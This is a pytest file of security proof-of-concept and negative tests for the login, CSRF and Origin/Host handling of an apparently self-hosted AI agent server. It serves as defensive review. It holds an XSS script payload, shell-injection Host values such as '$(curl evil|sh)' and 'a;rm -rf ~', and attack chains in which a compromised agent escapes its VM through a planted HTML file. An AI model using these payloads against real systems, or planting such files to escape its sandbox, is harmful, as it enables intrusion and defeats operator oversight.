"""SR4 adversarial review — CSRF / cookies / Origin / Host on the paste-code
device login and the LAN-first origin logic.

Each test is a PoC (the assertion states the CURRENT, exploitable behaviour and
is named test_poc_*) or a documented negative (test_neg_*: an attack that was
tried and is refused). Nothing here fixes anything; when a fixer closes a hole
the matching test_poc_* goes red and should be inverted, not deleted.

Threat model assumed throughout: the operator's browser holds a `jarvis_token`
cookie for the LAN server (http, cookie_secure off), and the agent may be
compromised (it can write project files — CLAUDE.md's stated assumption).
"""
import base64

import httpx
import pytest
from starlette.testclient import TestClient

from backend import auth, devices_api, guest_shell, lan, pastelogin
from backend.auth import COOKIE_NAME, hash_password, make_token, require_same_origin
from backend.config import settings
from backend.db import get_db, init_db
from backend.main import app

HOST = "jav3.lan:8000"
BASE = f"http://{HOST}"
SELF = f"http://{HOST}"
MINT = "/api/devices/login-code"
REDEEM = "/api/devices/login"


@pytest.fixture(autouse=True)
def _reset():
    pastelogin.reset_for_tests()
    yield
    pastelogin.reset_for_tests()


@pytest.fixture
def fake_lan(monkeypatch):
    monkeypatch.setattr(lan, "lan_ips", lambda: ["192.168.5.20"])
    monkeypatch.setattr(lan.socket, "gethostname", lambda: "boxy")
    monkeypatch.setattr(lan, "_own", None)
    monkeypatch.setitem(lan._state, "hostname", "jarvis.local")
    yield
    lan._own = None


@pytest.fixture
async def op(tmp_env):
    """(operator client with a session cookie, cookieless client)."""
    await init_db()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("hunter2")))
        await db.commit()
    finally:
        await db.close()
    t = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=t, base_url=BASE) as c, \
               httpx.AsyncClient(transport=t, base_url=BASE) as anon:
        r = await c.post("/api/auth/login",
                         json={"username": "operator", "password": "hunter2"})
        assert r.status_code == 200
        yield c, anon


async def _project_with_file(c, rel: str, content: str) -> str:
    """A project containing an agent-authored file. PUT /file is the operator
    route; the agent reaches the same bytes through writes.apply_write."""
    r = await c.post("/api/projects", json={"name": "demo"})
    assert r.status_code == 200, r.text
    slug = r.json()["slug"]
    r = await c.put(f"/api/projects/{slug}/file", json={"path": rel, "content": content})
    assert r.status_code == 200, r.text
    return slug


# =============================================================================
# F1 (HIGH) — agent-authored HTML/SVG is served as live same-origin content
# =============================================================================

XSS = "<script>fetch('/api/devices/login-code',{method:'POST'})</script>"


async def test_poc_raw_serves_agent_html_as_active_same_origin_page(op):
    """workspace.py:178 `raw` returns FileResponse with an extension-guessed
    type: an .html (or .svg) the agent wrote is served text/html from the app's
    own origin with no `Content-Security-Policy: sandbox`, no
    `Content-Disposition: attachment`, no nosniff. The Workspace Renderer
    previews it in a sandboxed srcDoc iframe, but its "raw" link
    (Workspace.jsx:746, and :942 for run artifacts) opens THIS url top-level —
    unsandboxed, same-origin, cookie attached."""
    c, _ = op
    slug = await _project_with_file(c, "code/report.html", XSS)
    r = await c.get(f"/api/projects/{slug}/raw/code/report.html")
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("text/html")
    assert XSS in r.text
    csp = r.headers.get("content-security-policy", "")
    assert "sandbox" not in csp and "script-src" not in csp   # only frame-ancestors
    assert "attachment" not in r.headers.get("content-disposition", "")
    assert r.headers.get("x-content-type-options") is None

    await c.put(f"/api/projects/{slug}/file", json={
        "path": "code/plot.svg",
        "content": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'})
    r = await c.get(f"/api/projects/{slug}/raw/code/plot.svg")
    assert r.headers["content-type"].startswith("image/svg+xml")


async def test_poc_same_origin_page_mints_reads_and_redeems_a_login_code(op):
    """Chain from F1: script on the raw page is same-origin, so Origin == Host
    and require_same_origin passes; the JSON response is readable (no CORS
    needed); redeem is unauthenticated. Result: a persistent, revocable-only
    device token held by the attacker's script, no operator click beyond
    opening the file. (The same script can equally call any cookie route.)"""
    c, anon = op
    r = await c.post(MINT, json={}, headers={"Origin": SELF})
    assert r.status_code == 200
    code = r.json()["code"]
    r = await anon.post(REDEEM, json={"code": code, "hostname": "attacker"})
    assert r.status_code == 200
    tok = r.json()["token"]
    who = await anon.get("/api/devices/whoami", headers={"Authorization": f"Bearer {tok}"})
    assert who.status_code == 200 and who.json()["is_device"] is True


async def test_poc_same_origin_page_runs_code_on_the_host(op, tmp_env):
    """Chain from F1, worse: POST /api/projects/{slug}/run executes Python on
    the HOST (runner.py: plain subprocess with rlimits, os.environ inherited)
    and has no require_same_origin. A web-tainted agent that writes one .html
    file escapes the KVM guest the moment the operator opens it via "raw"."""
    c, _ = op
    slug = await _project_with_file(c, "code/x.txt", "x")
    marker = tmp_env / "host-side-effect"
    r = await c.post(f"/api/projects/{slug}/run", headers={"Origin": SELF},
                     json={"code": f"open({str(marker)!r},'w').write('pwned')"})
    assert r.status_code == 200, r.text
    assert marker.read_text() == "pwned"


# =============================================================================
# F2 (MEDIUM) — require_same_origin covers 7 routes; ~80 cookie routes lack it
# =============================================================================

def _routes_without_same_origin() -> set[tuple[str, str]]:
    from fastapi.routing import APIRoute

    def deps(d, acc):
        for s in d.dependencies:
            acc.add(s.call)
            deps(s, acc)
        return acc

    out = set()

    def walk(routes, extra):
        for r in routes:
            if hasattr(r, "original_router"):
                walk(r.original_router.routes,
                     extra | {d.dependency for d in r.original_router.dependencies}
                     | {d.dependency for d in r.include_context.dependencies})
            elif isinstance(r, APIRoute):
                for m in r.methods - {"GET", "HEAD", "OPTIONS"}:
                    if require_same_origin not in deps(r.dependant, set()) | extra:
                        out.add((m, r.path))
    walk(app.routes, set())
    return out


def test_poc_csrf_guard_missing_on_sensitive_cookie_routes():
    """auth.py:require_same_origin is wired only on devices, backup and
    media/tarmac. The rest of the control plane — including host code
    execution, secrets, egress approval and git approval — has none."""
    missing = _routes_without_same_origin()
    for route in [("POST", "/api/projects/{slug}/run"),
                  ("PUT", "/api/secrets/{name}"),
                  ("POST", "/api/egress/pending/{pid}/approve"),
                  ("POST", "/api/egress/grants/{slug}"),
                  ("POST", "/api/projects/{slug}/git/requests/{rid}/approve"),
                  ("POST", "/api/memory/notes/{name}/promote"),
                  ("POST", "/api/projects/{slug}/upload"),
                  ("POST", "/api/chat"),
                  ("PUT", "/api/model")]:
        assert route in missing, route
    assert len(missing) > 70


@pytest.mark.parametrize("origin", ["http://jav3.lan:9999", "http://evil.example"])
async def test_poc_bodyless_posts_accept_a_foreign_origin(op, origin):
    """Body-less POSTs are HTML-<form>-submittable (no preflight). With a
    foreign Origin they are not refused (a 404 for a missing id proves the
    request got past every guard). SameSite=Lax keeps the cookie off a
    cross-SITE form POST, so the live attacker is a same-site origin: any other
    port on the server's hostname/IP (site ignores port), e.g. a companion
    service or anything a local process binds. Targets: egress approve
    (allowlists an exfil host), git request approve, memory-note promote
    (launders a tainted note into binding context), security ack_all (hides
    the alerts), schedule run-now, vm boot, reviewer undo."""
    c, _ = op
    form = {"Origin": origin, "Content-Type": "application/x-www-form-urlencoded"}
    r = await c.post("/api/security/events/ack_all", headers=form)
    assert r.status_code == 200
    for path in ["/api/egress/pending/999/approve",
                 "/api/projects/nope/git/requests/1/approve",
                 "/api/memory/notes/nope/promote",
                 "/api/schedules/999/run-now"]:
        r = await c.post(path, headers=form)
        assert r.status_code != 403 and r.status_code != 401, (path, r.status_code)


async def test_poc_multipart_upload_accepts_a_foreign_origin(op):
    """upload is multipart — a plain <form enctype=multipart/form-data> can
    send it without preflight. A same-site page plants an .html into a project
    with no Origin check, which F1 then turns into same-origin script."""
    c, _ = op
    slug = await _project_with_file(c, "code/x.txt", "x")
    r = await c.post(f"/api/projects/{slug}/upload",
                     headers={"Origin": "http://evil.example"},
                     files={"file": ("planted.html", XSS.encode(), "text/html")})
    assert r.status_code == 200, r.text
    r = await c.get(f"/api/projects/{slug}/files")
    assert "planted.html" in r.text


# =============================================================================
# F3 (MEDIUM, defense-in-depth) — the Origin check compares hostnames only
# =============================================================================

async def test_poc_origin_check_ignores_port(op):
    """auth.py:require_same_origin drops the port on both sides, so an origin
    on ANY port of the server's own hostname passes (A2's finding, confirmed
    on the live route)."""
    c, _ = op
    r = await c.post(MINT, json={}, headers={"Origin": "http://jav3.lan:1"})
    assert r.status_code == 200
    r = await c.post(MINT, json={}, headers={"Origin": "https://jav3.lan:65535"})
    assert r.status_code == 200   # scheme is ignored too


async def test_poc_auto_allowed_lan_names_pass_on_any_port(op, fake_lan):
    """lan.csrf_allowed_hosts() now folds in the bare hostname, <host>.local,
    the mDNS name (even when mDNS is OFF or failed — own_hosts() always adds
    `<instance>.local`) and every LAN IP. Each passes on any port, regardless
    of which name the operator actually browsed to."""
    c, _ = op
    for o in ["http://boxy:31337", "http://boxy.local:1", "http://jarvis.local:2",
              "http://192.168.5.20:8080"]:
        r = await c.post(MINT, json={}, headers={"Origin": o})
        assert r.status_code == 200, o


async def test_neg_login_code_cannot_be_minted_by_a_simple_request(op):
    """What actually stops a cross-port CSRF on login-code is NOT the Origin
    check but FastAPI's strict JSON content type (0.139 strict_content_type):
    every CORS-simple content type and a missing Content-Type are 422, so a
    cross-origin JSON POST needs a preflight, and nothing answers CORS
    (no CORSMiddleware, no Access-Control-* anywhere). Fragile: if CodeBody
    ever becomes optional, the endpoint turns form-mintable and F3 is the
    only guard left."""
    c, _ = op
    for ct in [None, "text/plain", "application/x-www-form-urlencoded",
               "multipart/form-data; boundary=x"]:
        req = c.build_request("POST", MINT, content=b"{}",
                              headers={"Origin": "http://jav3.lan:9999"})
        if ct is None:
            req.headers.pop("content-type", None)
        else:
            req.headers["content-type"] = ct
        assert (await c.send(req)).status_code == 422, ct
    r = await c.options(MINT, headers={"Origin": "http://jav3.lan:9999",
                                       "Access-Control-Request-Method": "POST"})
    assert not any(k.lower().startswith("access-control-") for k in r.headers)


async def test_neg_origin_null_and_foreign_refused(op):
    c, _ = op
    for o in ["null", "http://evil.example", "http://jav3.lan.evil.example",
              "http://evil.example#@jav3.lan", "file://"]:
        r = await c.post(MINT, json={}, headers={"Origin": o})
        assert r.status_code == 403, o


async def test_poc_missing_origin_with_a_cookie_is_allowed_and_referer_ignored(op):
    """A missing Origin is allowed even when the request carries the session
    cookie; Referer is never consulted. Low: every current browser sends Origin
    on a cross-origin POST, so this needs a non-browser holding the cookie."""
    c, _ = op
    r = await c.post(MINT, json={}, headers={"Referer": "http://evil.example/x"})
    assert r.status_code == 200


def test_poc_ipv6_host_breaks_the_same_origin_check():
    """Host.split(':')[0] on a bracketed IPv6 Host yields '[' — a same-origin
    IPv6 browser is refused (functional bug, not a bypass)."""
    from fastapi import HTTPException
    from starlette.requests import Request
    req = Request({"type": "http", "headers": [
        (b"origin", b"http://[fd00::5]:8000"), (b"host", b"[fd00::5]:8000")]})
    with pytest.raises(HTTPException):
        require_same_origin(req)


# =============================================================================
# F4 (LOW) — Host header -> address= / install.sh
# =============================================================================

@pytest.mark.parametrize("host", ["127.1:8000", "0x7f000001:8000", "2130706433:8000",
                                  "a..b:8000", "x:00080"])
async def test_poc_loopback_aliases_and_odd_names_are_echoed_as_address(op, host, monkeypatch):
    """_HOST_RE accepts short/hex/decimal IPv4 forms and empty labels;
    _is_loopback only recognises canonical forms, so `127.1` / `0x7f000001` /
    `2130706433` (all 127.0.0.1 to a resolver) are handed to the OTHER computer
    as the address. Low: the Host is chosen by the operator's own browser;
    the result is a CLI that talks to its own loopback, not an attacker."""
    c, _ = op
    monkeypatch.setattr(devices_api.lan, "lan_ips", lambda: ["10.0.0.9"])
    monkeypatch.setattr(devices_api.lan, "advertised_hostname", lambda: "")
    r = await c.post(MINT, json={}, headers={"Host": host})
    assert r.json()["address"] == host


@pytest.mark.parametrize("host", ["x code=evil", "a@b:8000", "evil.example.:80",
                                  "jäv3.lan:8000", "x:0", "x:65536", "$(id)", "`id`",
                                  'a"b', "a b", "[fe80::1%eth0]:8000", "-a.b",
                                  "localhost:8000\r\nX: y"])
async def test_neg_hostile_host_headers_are_not_echoed(op, host, monkeypatch):
    c, _ = op
    monkeypatch.setattr(devices_api.lan, "lan_ips", lambda: ["10.0.0.9"])
    monkeypatch.setattr(devices_api.lan, "advertised_hostname", lambda: "")
    assert devices_api._host_header(type("R", (), {"headers": {"host": host}})()) is None


async def test_neg_rebinding_host_gets_no_cookie_and_cannot_mint(op):
    """DNS rebinding: evil.example re-resolves to the server. Origin == Host ==
    evil.example so require_same_origin PASSES (it trusts Host, and there is no
    Host allowlist / TrustedHostMiddleware) — but the cookie is host-only for
    the real name, so the browser sends none and every cookie route is 401."""
    _, anon = op
    r = await anon.post(MINT, json={}, headers={"Host": "evil.example:8000",
                                               "Origin": "http://evil.example:8000"})
    assert r.status_code == 401


async def test_poc_rebinding_reaches_unauthenticated_routes(op):
    """…but the unauthenticated surface answers any Host: install.sh reflects
    the rebinding name, /api/devices/login accepts guesses charged to the
    OPERATOR's own peer IP (the victim browser is the TCP peer), so a rebinding
    page can burn the operator machine's 10-miss budget and lock its own
    `jav3 login` out for the TTL window."""
    _, anon = op
    r = await anon.get("/cli/install.sh", headers={"Host": "evil.example:8000"})
    assert r.status_code == 200 and 'BASE="http://evil.example:8000"' in r.text
    h = {"Host": "evil.example:8000", "Origin": "http://evil.example:8000"}
    for _ in range(pastelogin._WRONG_PER_PEER):
        await anon.post(REDEEM, json={"code": "A" * 43}, headers=h)
    code, _t = pastelogin.mint("legit", by="operator")
    r = await anon.post(REDEEM, json={"code": code})          # the real CLI, same peer
    assert r.status_code == 429


@pytest.mark.parametrize("host", ["a;rm -rf ~", "$(curl evil|sh)", "a`id`", 'a"b',
                                  "a\\b", "a'b"])
async def test_neg_install_sh_host_cannot_inject_shell(op, host):
    _, anon = op
    r = await anon.get("/cli/install.sh", headers={"Host": host})
    assert r.status_code == 400


# =============================================================================
# F5 — cookie attributes and WebSockets
# =============================================================================

async def test_neg_session_cookie_is_httponly_lax_hostonly(tmp_env):
    await init_db()
    db = await get_db()
    try:
        await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                         ("operator", hash_password("pw")))
        await db.commit()
    finally:
        await db.close()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url=BASE) as c:
        r = await c.post("/api/auth/login", json={"username": "operator", "password": "pw"})
    sc = r.headers["set-cookie"].lower()
    assert "httponly" in sc and "samesite=lax" in sc and "path=/" in sc
    assert "domain=" not in sc                 # host-only
    assert "secure" not in sc                  # LAN default: cleartext on the wire
    assert settings.cookie_secure is False


def test_poc_guest_shell_websocket_has_no_origin_check(tmp_env, monkeypatch):
    """guest_shell.py:154 (and voice_api.py:49) accept the WS on the cookie
    alone — no Origin check. Cross-SITE, Lax keeps the cookie off the
    handshake; a same-site origin (another port on the host) gets an
    interactive shell into the guest."""
    async def fake_session(recv, send, slug):
        await send("shell-open")
    monkeypatch.setattr(guest_shell, "_session", fake_session)
    tok = make_token(1, "operator")
    tc = TestClient(app, base_url=BASE)          # no `with`: skip the lifespan (VM, mDNS)
    tc.cookies.set(COOKIE_NAME, tok)
    with tc.websocket_connect("/api/guest/shell",
                              headers={"Origin": "http://evil.example"}) as ws:
        assert ws.receive_text() == "shell-open"


# =============================================================================
# Out of angle, found while here
# =============================================================================

async def test_poc_git_basic_auth_bypasses_the_login_throttle(op):
    """git_serve_api._require_basic checks the password with no throttle, no
    delay and no login_failed alert — an unmetered oracle for the GUI password
    (git_serve_enabled defaults True), reachable from the LAN or a rebinding
    page."""
    _, anon = op
    auth._failures.clear()
    bad = base64.b64encode(b"operator:wrong").decode()
    for _ in range(12):
        r = await anon.get("/git/demo/info/refs?service=git-upload-pack",
                           headers={"Authorization": f"Basic {bad}"})
        assert r.status_code == 401
    assert auth._failures == {}
